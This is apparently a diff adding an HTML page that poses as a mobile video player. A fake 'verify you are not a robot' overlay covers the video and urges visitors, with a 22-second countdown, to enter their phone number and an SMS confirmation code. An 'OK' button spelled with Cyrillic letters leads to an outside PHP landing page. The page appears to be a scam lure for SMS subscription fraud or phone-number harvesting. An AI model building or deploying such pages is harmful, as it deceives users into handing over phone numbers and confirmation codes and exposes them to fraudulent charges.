@@ -1,0 +1,203 @@
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:th="http://www.thymeleaf.org">
+
+<head>
+	<title>视频播放器</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+	<meta name="MobileOptimized" content="width" />
+	<meta name="HandheldFriendly" content="true" />
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+	<meta name="format-detection" content="telephone=no" />
+
+	<style>
+		* {
+			margin: 0;
+			padding: 0;
+			box-sizing: border-box;
+		}
+
+		body {
+			background: #000;
+			font-family: 'Open Sans', sans-serif;
+			height: 100vh;
+			display: flex;
+			flex-direction: column;
+		}
+
+		.container {
+			display: flex;
+			flex-direction: column;
+			max-width: 480px;
+			height: 100vh;
+			margin: 0 auto;
+			position: relative;
+			overflow: hidden;
+		}
+
+		.header {
+			width: 100%;
+			height: 15%;
+			min-height: 60px;
+			display: flex;
+			align-items: center;
+			justify-content: center;
+			background: #000;
+			z-index: 10;
+		}
+
+		.header img {
+			max-height: 100%;
+			max-width: 100%;
+			object-fit: contain;
+		}
+
+		.video-container {
+			width: 100%;
+			height: 70%;
+			position: relative;
+			background: #000;
+			display: flex;
+			align-items: center;
+			justify-content: center;
+		}
+
+		.video-container video {
+			width: 100%;
+			height: 100%;
+			object-fit: contain;
+			background: #000;
+		}
+
+		.play-button {
+			position: absolute;
+			width: 70px;
+			height: 70px;
+			cursor: pointer;
+			z-index: 5;
+		}
+
+		.footer {
+			width: 100%;
+			height: 15%;
+			min-height: 60px;
+			display: flex;
+			flex-direction: column;
+			align-items: center;
+			justify-content: center;
+			background: #000;
+			z-index: 10;
+		}
+
+		.footer img {
+			max-height: 100%;
+			max-width: 100%;
+			object-fit: contain;
+		}
+
+		.timer {
+			color: #fff;
+			font-size: 13px;
+			margin-bottom: 5px;
+		}
+
+		.verification-box {
+			position: absolute;
+			top: 50%;
+			left: 50%;
+			transform: translate(-50%, -50%);
+			background-color: rgba(247, 247, 247, 0.9);
+			max-width: 320px;
+			width: 90%;
+			padding: 20px;
+			border-radius: 15px;
+			z-index: 20;
+			text-align: center;
+		}
+
+		.verification-title {
+			font-size: 15px;
+			font-weight: 600;
+			padding-bottom: 10px;
+		}
+
+		.verification-text {
+			font-size: 13px;
+			margin: 5px 0;
+		}
+
+		.verification-timer {
+			font-size: 13px;
+			padding: 10px;
+		}
+
+		.verification-btn {
+			display: block;
+			border-top: 1px solid #8f8f8f;
+			color: #1777ED;
+			padding-top: 15px;
+			font-size: 18px;
+			font-weight: bold;
+			text-decoration: none;
+		}
+	</style>
+</head>
+
+<body>
+	<div class="container">
+		<!-- 顶部图片 -->
+		<div class="header">
+			<img src="top.jpg" alt="顶部装饰" />
+		</div>
+
+		<!-- 中间视频区域 -->
+		<div class="video-container">
+			<video poster="poster.jpg" src="video.mp4">
+				<source type="video/mp4">
+			</video>
+			
+			<!-- 播放按钮 -->
+			<svg class="play-button" viewBox="0 0 48 48" fill="#fff" xmlns="http://www.w3.org/2000/svg" onclick="playVideo()">
+				<path fill-rule="evenodd" clip-rule="evenodd"
+					d="M12 8.77702C12 6.43812 14.5577 4.99881 16.5569 6.21266L41.6301 21.4356C43.5542 22.6038 43.5542 25.3962 41.6301 26.5644L16.5569 41.7873C14.5577 43.0012 12 41.5619 12 39.223V8.77702Z">
+				</path>
+			</svg>
+		</div>
+
+		<!-- 底部图片 -->
+		<div class="footer">
+			<div class="timer"><span id="time">0:00</span>/0:09</div>
+			<img src="bottom.jpg" alt="底部装饰" />
+		</div>
+
+		<!-- 验证框 -->
+		<div class="verification-box">
+			<div class="verification-title">Attention! you must verify that you are not a robot</div>
+			<div class="verification-text">Press "OK" to confirm</div>
+			<div class="verification-text">1.Enter your phone number</div>
+			<div class="verification-text">2.Enter the confirmation code from SMS</div>
+			<div class="verification-timer">22 seconds left</div>
+			<a href="https://weiplus.live/cgbrl6k.php?lp=1" class="verification-btn">ОК</a>
+		</div>
+	</div>
+
+	<script>
+		let timeLeft = 22;
+		const timerElement = document.querySelector('.verification-timer');
+		const countdown = setInterval(() => {
+			timeLeft--;
+			if (timeLeft > 0) {
+				timerElement.textContent = `${timeLeft} seconds left`;
+			} else {
+				timerElement.textContent = `Time's up!`;
+				clearInterval(countdown);
+			}
+		}, 1000);
+
+		function playVideo() {
+			const video = document.querySelector('video');
+			video.play();
+			document.querySelector('.play-button').style.display = 'none';
+		}
+	</script>
+</body>
+
+</html>
